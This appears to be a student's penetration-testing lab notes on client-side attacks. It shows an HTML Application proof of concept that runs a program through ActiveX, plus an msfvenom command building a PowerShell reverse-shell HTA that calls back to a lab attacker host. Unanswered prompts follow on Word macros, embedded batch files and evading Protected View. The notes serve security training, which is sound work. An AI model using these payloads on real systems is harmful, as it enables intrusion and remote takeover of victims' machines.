# 13.2.3 Leveraging HTML Application
#### Exercises
_(To be performed on your own Kali and Windows lab client machines)_

**1.  Use msfvenom to generate a HTML Application and use it to compromise your Windows client.**

If a file is saved as with an .hta instead of an .htm extension, internet explorer will automatically interpret it as HTML and off the ability to execute using mshta.exe. Since the HTML application is being executed outside the safety of the browser, we are free to use dangerous legacy code that may normally be blocked within the browser. For the following example we are going to leverage ActiveXObjects.

The following PoC should launch the calculator in our test environment:
```
<html>
<body>

<script>

  var c= 'calc.exe'
  new ActiveXObject('WScript.Shell').Run(c);
  
</script>

</body>
</html>
```

Placing this in our html folder on our kali machine and then navigated to the poc.hta endpoint on our windows test machine and we see the following:
![[Pasted image 20220715172425.png]]

When we run the PoC we get a successful calc.exe command:
![[Pasted image 20220715172534.png]]


Now we can move into utilizing msfvenom to alter our hta page and create a new powershell based payload. We can use the following command:
`sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/reverse.hta`

Once generated, we need to setup a listener on the specified port and navigate to the endpoint on our Windows test machine and we will get a reverse shell.

![[Pasted image 20220715173157.png]]
![[Pasted image 20220715173122.png]]

**2.  Is it possible to use the HTML Application attack against Microsoft Edge users, and if so, how?**
Yes, upon testing with Microsoft Edge the hta file was successful in obtaining a reverse shell.

![[Pasted image 20220715173422.png]]
![[Pasted image 20220715173441.png]]
Upon clicking "Run" we recieve our connection.
![[Pasted image 20220715173521.png]]


# 13.3.3 Microsoft Word Macro
#### Exercises
**1. Use the PowerShell payload from the HTA attack to create a Word macro that sends a reverse shell to your Kali system.**



# 13.3.5 Object Linking and Embedding
#### Exercises
_(To be performed on your own Kali and Windows lab client machines)_

**1.  Use the PowerShell payload to create a batch file and embed it in a Microsoft Word document to send a reverse shell to your Kali system.**


# 13.3.7Evading Protected View
#### Exercises
_(To be performed on your own Kali and Windows lab client machines)_

**1.  Trigger the protection by Protected View by simulating a download of the Microsoft Word document from the Internet.**
**2.  Reuse the batch file and embed it in a Microsoft Publisher document to receive a reverse shell to your Kali system.**
**3.  Move the file to the Apache web server to simulate the download of the Publisher document from the Internet and confirm the missing Protected View.**